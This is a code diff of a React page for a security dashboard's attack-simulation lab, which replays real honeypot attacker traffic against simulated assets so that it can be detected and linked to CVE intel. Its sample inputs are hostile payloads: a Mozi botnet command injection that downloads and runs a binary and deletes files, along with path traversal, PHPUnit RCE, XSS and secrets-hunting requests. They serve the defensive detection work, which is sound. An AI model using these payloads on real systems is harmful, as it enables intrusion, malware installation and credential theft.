@@ -1,13 +1,18 @@
-import { useState } from 'react'
+import { useMemo, useState } from 'react'
+import { Link } from 'react-router-dom'
 import { notifyRefresh, post, useAssets, useData, useHealth, type Alert } from './api'
-import AttackGraph from './attack/AttackGraph'
+import AttackGraph, { type IntelCve } from './attack/AttackGraph'
 import { Empty, PageHead, Panel } from './ui'
 
-// Attack Lab: the backend writes the log lines a real server would record for a simple attack, a separate
-// detector reads ONLY that text and names the attack, then the correlator scores it as an incident.
+// Attack Lab on REAL data: real attackers' real requests and connection attempts (SANS Internet Storm Center
+// honeypots and firewall sensors) are replayed against one of our simulated assets, detected from the log text alone,
+// linked to our threat intel (CVE -> KEV/EPSS -> our asset inventory) and turned into a scored incident.
 
-type Playbook = { scenario: string; name: string; what: string; default_target: string; outcome_label: string | null; log_sources: string[] }
-type Match = { start: number; end: number; text: string; technique: string; signature: string }
+type Attacker = { ip: string; kind: 'web' | 'login' | 'scan'; headline: string; attack_types: string[]; rules: string[]; cve_ids: string[]
+  web_requests: number; firewall_records: number; first_seen: string | null; last_seen: string | null; country: string | null
+  as_name: string | null; threat_feeds: string[]; user_agents: string[]; detected: boolean; default_target: string }
+type Catalogue = { source: string; retrieved_at: string | null; note: string | null; web_requests: number; firewall_records: number; items: Attacker[] }
+type Match = { start: number; end: number; text: string; technique: string; signature: string; family?: string }
 type Line = { line_no: number; raw: string; source: string; flagged_by: string | null; decoded: string | null; matches: Match[] }
 type Mitre = { id: string; name: string; tactic: string; url: string }
 type Detection = { rule_id: string; name: string; label: string; stage: string; confidence: string; src_ip: string | null;
@@ -17,24 +22,38 @@ type Verdict = { attack_detected: boolean; headline: string; attack_types: strin
   mitre: Mitre[]; attacker_ips: string[]; decision_path: string[] }
 type Analysis = { lines: Line[]; detections: Detection[]; checks: Check[]; verdict: Verdict; parsed: Record<string, number> }
 type Step = { title: string; detail: string; actor: string; line_nos: number[] }
-type RunResult = Analysis & { run_id: string; scenario: string; name: string; data_classification: string; steps: Step[];
-  target: { asset_id: string; hostname: string; role: string }; correlation: { created: string[]; note: string; incidents: Alert[] } }
-type RuleBook = { rules: Rule[]; thresholds?: { brute_force_failures?: number; port_scan_distinct_ports?: number } }
+type Location = { country?: string; country_code?: string; city?: string; asn?: number; asn_org?: string; geo_source?: string }
+type Reputation = { as_name?: string; country?: string; isc_reports?: number | null; isc_targets?: number | null; threat_feeds: string[] }
+type RunResult = Analysis & { run_id: string; kind: string; data_classification: string; steps: Step[]; replayed: number; total_records: number
+  attacker: Attacker; target: { asset_id: string; hostname: string; role: string }
+  intel: { cves: IntelCve[]; attacker: { ip: string; reputation: Reputation | null; location: Location | null; our_ioc_hits: { source: string; type: string; malware_family: string | null }[] } }
+  correlation: { created: string[]; note: string; incidents: Alert[]; vulnerability_alerts: string[] } }
+type RuleBook = { rules: Rule[]; thresholds?: Record<string, number & number[]> }
 type Rule = { rule_id: string; name: string; log_source: string; kind: string; logic: string; why_it_works: string; mitre: Mitre[] }
 
 const STAGE_TONE: Record<string, string> = { Reconnaissance: 'medium', 'Attack attempt': 'high', 'Compromise likely': 'critical' }
+const KINDS: { id: string; label: string; test: (a: Attacker) => boolean }[] = [
+  { id: 'all', label: 'All', test: () => true },
+  { id: 'exploit', label: 'Known-CVE exploits', test: (a) => a.rules.includes('WEB-EXPLOIT-001') },
+  { id: 'inject', label: 'Injection / traversal', test: (a) => a.rules.some((r) => /CMDI|SQLI|TRAV|XSS/.test(r)) },
+  { id: 'login', label: 'Login hammering', test: (a) => a.kind === 'login' },
+  { id: 'scan', label: 'Port scans', test: (a) => a.kind === 'scan' },
+  { id: 'recon', label: 'Secrets scanning', test: (a) => a.rules.includes('WEB-RECON-001') },
+  { id: 'quiet', label: 'No rule fired', test: (a) => !a.detected },
+]
+// Real requests captured by SANS ISC honeypots (28-30 Oct 2026), for the paste box.
 const EXAMPLES: Record<string, string> = {
-  'SQL injection': "/login?user=admin' OR '1'='1'--\n/products?id=7 UNION SELECT username,password FROM users--",
-  'Command injection': '/tools/ping?host=8.8.8.8;cat /etc/passwd',
-  'Brute force': Array.from({ length: 12 }, (_, i) => `2026-10-31T10:00:${String(i * 3).padStart(2, '0')}+05:30 vpn sshd[311]: Failed password for admin from 203.0.113.9 port ${41000 + i} ssh2`).join('\n'),
-  'Normal input': "/search?q=O'Neil Road\n/report?from=2026-10-01&to=2026-10-31\nname=Rock and Roll",
+  'Mozi botnet injection': '/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron',
+  'PHPUnit RCE (CVE-2017-9841)': '/lib/phpunit/Util/PHP/eval-stdin.php\n/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
+  'Apache traversal (CVE-2021-41773)': '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh',
+  'XSS probe': "/?key='>\"<svg/onload=confirm('xss')>",
+  'Secrets hunting': '/.env\n/.git/config\n/phpinfo.php\n/wp-config.php.bak\n/.aws/credentials',
 }
 
-// Draw the URL-decoded request with every signature match highlighted.
 function Highlighted({ text, matches }: { text: string; matches: Match[] }) {
   const parts: React.ReactNode[] = []
   let at = 0
-  for (const m of [...matches].sort((a, b) => a.start - b.start)) {
+  for (const m of [...matches].filter((m) => m.end > m.start).sort((a, b) => a.start - b.start)) {
     if (m.start < at) continue
     parts.push(text.slice(at, m.start), <mark key={m.start} className="lab-mark" title={m.technique}>{text.slice(m.start, m.end)}</mark>)
     at = m.end
@@ -49,7 +68,7 @@ function LogLine({ line }: { line: Line }) {
       <span className="lab-no">{line.line_no}</span>
       <span className="min-w-0">
         <span className="block break-all">{line.raw}</span>
-        {line.matches.length > 0 && line.decoded && (
+        {line.matches.some((m) => m.end > m.start) && line.decoded && (
           <span className="mt-1 block break-all text-grey-200">decoded: <Highlighted text={line.decoded} matches={line.matches} /></span>
         )}
       </span>
@@ -89,7 +108,7 @@ function Detections({ result }: { result: Analysis }) {
   </>
 }
 
-function VerdictPanel({ v, children }: { v: Verdict; children?: React.ReactNode }) {
+function VerdictPanel({ v }: { v: Verdict }) {
   const tone = v.stage ? STAGE_TONE[v.stage] : 'low'
   return (
     <section className={`panel lab-verdict tone-${tone}`}>
@@ -98,12 +117,54 @@ function VerdictPanel({ v, children }: { v: Verdict; children?: React.ReactNode 
         <h2 className="font-display text-2xl font-light text-white">{v.headline}</h2>
         {v.attack_detected && <div className="flex flex-wrap items-center gap-2">
           <span className={`badge badge-${tone}`}>{v.stage}</span><span className="tag">confidence {v.confidence}</span>
-          {v.attacker_ips.map((ip) => <span key={ip} className="tag">attacker {ip}</span>)}
         </div>}
         {v.mitre.length > 0 && <MitreChips items={v.mitre} />}
-        <details open><summary className="cursor-pointer text-blue-300">Decision path</summary>
+        <details><summary className="cursor-pointer text-blue-300">Decision path</summary>
           <ol className="mt-2 list-decimal space-y-1 pl-5">{v.decision_path.map((p, i) => <li key={i}>{p}</li>)}</ol></details>
-        {children}
+      </div>
+    </section>
+  )
+}
+
+const MATCH_LABEL: Record<string, string> = { confirmed_affected: 'VULNERABLE', needs_verification: 'Possibly vulnerable', confirmed_unaffected: 'Not vulnerable' }
+
+// The link to our threat intelligence: who the attacker is, and what our feeds + matcher say about each exploited CVE.
+function IntelPanel({ run }: { run: RunResult }) {
+  const a = run.intel.attacker
+  const rep = a.reputation
+  const loc = a.location
+  return (
+    <section className="panel lab-intel mt-4">
+      <h2 className="panel-title">Threat intel on this attack · from our feeds, not from the replay</h2>
+      <div className="grid gap-4 p-4 lg:grid-cols-[minmax(0,1fr)_minmax(0,1.6fr)]">
+        <div className="grid content-start gap-2">
+          <p className="ag-kicker">Attacker</p>
+          <p className="font-mono text-lg text-white">{a.ip}</p>
+          <p>{[loc?.city, loc?.country ?? loc?.country_code].filter(Boolean).join(', ') || 'Location unknown'}{loc?.asn_org ? ` · ${loc.asn_org}` : ''}{loc?.asn ? ` (AS${loc.asn})` : ''}</p>
+          {rep?.isc_reports != null && <p className="text-sm">SANS ISC: {rep.isc_reports.toLocaleString('en-IN')} reports against {rep.isc_targets?.toLocaleString('en-IN') ?? '?'} targets</p>}
+          <div className="flex flex-wrap gap-1.5">
+            {rep?.threat_feeds.length ? rep.threat_feeds.map((f) => <span key={f} className="tag tag-attacker">{f}</span>)
+              : <span className="text-sm text-grey-400">Not listed in ISC's threat feeds</span>}
+          </div>
+          <p className="text-sm">{a.our_ioc_hits.length
+            ? <>In our IOC feeds: {a.our_ioc_hits.map((h) => `${h.source}${h.malware_family ? ` (${h.malware_family})` : ''}`).join(', ')}</>
+            : <span className="text-grey-400">Not in our abuse.ch / OTX / IP-reputation indicators</span>}</p>
+          <p className="text-xs text-grey-500">Location = where the network is registered, not the person behind it.</p>
+        </div>
+        <div>
+          <p className="ag-kicker">Exploited CVEs → our feed → our asset {run.target.asset_id}</p>
+          {!run.intel.cves.length ? <p className="mt-2 text-grey-300">No request named a specific CVE. Detection relied on behaviour (signatures, thresholds).</p> :
+            <table className="dash-table mt-1"><thead><tr><th>CVE</th><th>KEV</th><th>EPSS</th><th>CVSS</th><th>{run.target.asset_id}</th><th>Other assets</th></tr></thead>
+              <tbody>{run.intel.cves.map((c) => (
+                <tr key={c.cve_id}>
+                  <td><Link className="text-blue-300 underline" to={`/app/threats?search=${c.cve_id}`}>{c.cve_id}</Link><span className="block text-xs text-grey-400">{c.title?.replace(`${c.cve_id}: `, '') ?? 'not in our feed'}</span></td>
+                  <td>{c.kev_listed ? <span className="badge badge-critical">Exploited</span> : c.kev_listed === false ? 'No' : '—'}</td>
+                  <td>{c.epss != null ? `${(c.epss * 100).toFixed(1)}%` : '—'}</td>
+                  <td>{c.cvss ?? '—'}</td>
+                  <td title={c.target_reason}><span className={`tag ${c.target_match === 'confirmed_affected' ? 'tag-attacker' : ''}`}>{MATCH_LABEL[c.target_match ?? ''] ?? '—'}</span></td>
+                  <td className="text-sm">{c.other_exposed_assets?.length ? c.other_exposed_assets.join(', ') : 'none'}</td>
+                </tr>))}</tbody></table>}
+        </div>
       </div>
     </section>
   )
@@ -112,26 +173,28 @@ function VerdictPanel({ v, children }: { v: Verdict; children?: React.ReactNode 
 export default function AttackLab() {
   const health = useHealth()
   const assets = useAssets()
-  const playbooks = useData<Playbook[]>('/api/attack-lab/playbooks', [], (j) => j as Playbook[])
+  const cat = useData<Catalogue>('/api/attack-lab/attackers', { source: '', retrieved_at: null, note: null, web_requests: 0, firewall_records: 0, items: [] }, (j) => j as Catalogue)
   const rules = useData<RuleBook>('/api/attack-lab/rules', { rules: [] }, (j) => j as RuleBook)
-  const [scenario, setScenario] = useState('sql_injection')
+  const [filter, setFilter] = useState('all')
+  const [pick, setPick] = useState<string | null>(null)
   const [target, setTarget] = useState('')
-  const [succeed, setSucceed] = useState(true)
   const [state, setState] = useState<{ busy?: boolean; result?: RunResult; error?: string }>({})
-  const [text, setText] = useState(EXAMPLES['SQL injection'])
+  const [text, setText] = useState(EXAMPLES['Mozi botnet injection'])
   const [mine, setMine] = useState<{ busy?: boolean; result?: Analysis; error?: string }>({})
 
-  const pb = playbooks.data.find((p) => p.scenario === scenario)
+  const shown = useMemo(() => cat.data.items.filter(KINDS.find((k) => k.id === filter)!.test), [cat.data.items, filter])
+  const chosen = cat.data.items.find((a) => a.ip === pick) ?? shown[0]
   const enabled = health.mode === 'live' && health.data.demo_mode
   const result = state.result
 
   const run = async () => {
+    if (!chosen) return
     setState({ busy: true })
     try {
-      const r = await post('/api/attack-lab/run', { scenario, target_asset_id: target || null, succeed }) as RunResult
+      const r = await post('/api/attack-lab/run', { attacker_ip: chosen.ip, target_asset_id: target || null }) as RunResult
       setState({ result: r })
       notifyRefresh()
-    } catch (e) { setState({ error: e instanceof Error ? e.message : 'Simulation failed' }) }
+    } catch (e) { setState({ error: e instanceof Error ? e.message : 'Replay failed' }) }
   }
   const reset = async () => {
     try { await post('/api/demo/reset-alerts'); setState({}); notifyRefresh() }
@@ -146,52 +209,62 @@ export default function AttackLab() {
   return <>
     <PageHead title="Attack simulation" classic />
     <p className="mb-4 max-w-4xl">
-      Pick a simple attack and a simulated asset. The lab writes the log lines a real server would record. The detector
-      reads <b className="text-white">only that text</b> (it is never told which attack ran), names the attack, and the
-      correlation engine turns it into a scored incident. Everything is synthetic; no traffic leaves this machine.
+      <b className="text-white">Real attackers, real traffic.</b> These requests and connection attempts hit SANS Internet
+      Storm Center honeypots and firewall sensors on the internet. We replay one attacker against an asset in our
+      (simulated) inventory: the detector reads only the log text, each exploited CVE is looked up in our NVD / CISA KEV
+      feed and matched against our assets, and the result becomes a scored incident.
     </p>
 
-    <Panel title="1 · Choose an attack">
-      <div className="grid gap-3 p-4 sm:grid-cols-2 xl:grid-cols-5">
-        {playbooks.data.map((p) => (
-          <button key={p.scenario} type="button" aria-pressed={p.scenario === scenario}
-            className={`lab-card ${p.scenario === scenario ? 'is-on' : ''}`} onClick={() => { setScenario(p.scenario); setTarget('') }}>
-            <b className="text-white">{p.name}</b>
-            <span className="text-sm">{p.what}</span>
-            <span className="mt-auto flex flex-wrap gap-1">{p.log_sources.map((s) => <span key={s} className="tag">{s} log</span>)}</span>
+    <Panel title={`1 · Choose a real attacker · ${cat.data.items.length} from ${cat.data.web_requests.toLocaleString('en-IN')} web requests and ${cat.data.firewall_records.toLocaleString('en-IN')} firewall records`}>
+      <div className="flex flex-wrap gap-2 px-4 pt-4">
+        {KINDS.map((k) => {
+          const n = cat.data.items.filter(k.test).length
+          return n || k.id === 'all' ? <button key={k.id} type="button" className={`tag ${filter === k.id ? 'tag-attacker' : ''}`} onClick={() => { setFilter(k.id); setPick(null); setTarget('') }}>{k.label} ({n})</button> : null
+        })}
+      </div>
+      <div className="grid gap-3 p-4 sm:grid-cols-2 xl:grid-cols-4">
+        {shown.map((a) => (
+          <button key={a.ip} type="button" aria-pressed={a.ip === chosen?.ip}
+            className={`lab-card ${a.ip === chosen?.ip ? 'is-on' : ''}`} onClick={() => { setPick(a.ip); setTarget('') }}>
+            <span className="flex items-baseline justify-between gap-2"><b className="font-mono text-white">{a.ip}</b><span className="text-xs">{a.country ?? '??'}</span></span>
+            <span className="text-sm text-white">{a.detected ? a.attack_types.join(' + ') : 'No rule fired (control)'}</span>
+            <span className="text-xs">{a.as_name ?? 'network unknown'} · {a.web_requests ? `${a.web_requests} web requests` : ''}{a.web_requests && a.firewall_records ? ' · ' : ''}{a.firewall_records ? `${a.firewall_records} firewall records` : ''}</span>
+            <span className="mt-auto flex flex-wrap gap-1">
+              {a.cve_ids.map((c) => <span key={c} className="tag tag-attacker">{c}</span>)}
+              {a.threat_feeds.length > 0 && <span className="tag">in {a.threat_feeds.length} threat feed{a.threat_feeds.length > 1 ? 's' : ''}</span>}
+              <span className="tag">{a.first_seen}{a.last_seen && a.last_seen !== a.first_seen ? ` → ${a.last_seen}` : ''}</span>
+            </span>
           </button>
         ))}
-        {!playbooks.data.length && <Empty>Attack playbooks need the backend.</Empty>}
+        {!cat.data.items.length && <Empty>Real attacker data needs the backend (backend/data/cache/isc.json).</Empty>}
       </div>
       <div className="flex flex-wrap items-center gap-3 border-t border-rule p-4">
-        <label className="flex items-center gap-2">Target
-          <select className="dash-select" value={target || pb?.default_target || ''} onChange={(e) => setTarget(e.target.value)}>
+        <label className="flex items-center gap-2">Replay against
+          <select className="dash-select" value={target || chosen?.default_target || ''} onChange={(e) => setTarget(e.target.value)}>
             {assets.data.map((a) => <option key={a.asset_id} value={a.asset_id}>{a.asset_id} · {a.hostname} · {a.role}</option>)}
           </select>
         </label>
-        {pb?.outcome_label && <label className="flex items-center gap-2">
-          <input type="checkbox" checked={succeed} onChange={(e) => setSucceed(e.target.checked)} />
-          Attack succeeds ({pb.outcome_label.toLowerCase()})
-        </label>}
-        <button type="button" className="btn-line" disabled={!enabled || state.busy} onClick={run}>{state.busy ? 'Running' : 'Run attack'}</button>
+        <button type="button" className="btn-line" disabled={!enabled || state.busy || !chosen} onClick={run}>{state.busy ? 'Replaying' : 'Replay attack'}</button>
         <button type="button" className="btn-line" disabled={!enabled || state.busy} onClick={reset}>Reset demo alerts</button>
-        {!enabled && <p className="w-full text-grey-300">Running attacks needs the backend in demo mode. The rulebook and log analyzer below still work when connected.</p>}
+        <p className="w-full text-sm text-grey-400">Source: {cat.data.source || 'SANS ISC'}{cat.data.retrieved_at ? ` · fetched ${new Date(cat.data.retrieved_at).toLocaleString('en-IN', { dateStyle: 'medium', timeStyle: 'short' })}` : ''}. The default target is an asset our matcher says is vulnerable to the exploited CVE, when one exists.</p>
+        {!enabled && <p className="w-full text-grey-300">Replaying needs the backend in demo mode. The rulebook and log analyzer below still work when connected.</p>}
         {state.error && <p role="status" className="w-full text-sev-high">{state.error}</p>}
       </div>
     </Panel>
 
     {result && <>
       <div className="mt-4"><AttackGraph key={result.run_id} run={result} thresholds={rules.data.thresholds ?? {}} /></div>
+      <IntelPanel run={result} />
       <details className="mt-4">
         <summary className="cursor-pointer text-blue-300">Rule-by-rule details</summary>
         <div className="mt-2"><Detections result={result} /></div>
       </details>
-      <p className="mt-2 text-sm text-grey-400">{result.data_classification} · run {result.run_id} · parsed {Object.entries(result.parsed).filter(([, n]) => n).map(([s, n]) => `${n} ${s}`).join(', ')}</p>
+      <p className="mt-2 text-sm text-grey-400">{result.data_classification} · replayed {result.replayed} of {result.total_records} real records · run {result.run_id}</p>
     </>}
 
     <Panel title="Try it yourself: paste log lines or a request" className="mt-6">
       <div className="grid gap-3 p-4">
-        <div className="flex flex-wrap gap-2">{Object.keys(EXAMPLES).map((k) =>
+        <div className="flex flex-wrap items-center gap-2"><span className="text-sm text-grey-400">Real honeypot requests:</span>{Object.keys(EXAMPLES).map((k) =>
           <button key={k} type="button" className="tag" onClick={() => { setText(EXAMPLES[k]); setMine({}) }}>{k}</button>)}</div>
         <textarea className="dash-select min-h-32 font-mono text-sm" value={text} onChange={(e) => setText(e.target.value)}
           aria-label="Log lines to analyse" spellCheck={false} />
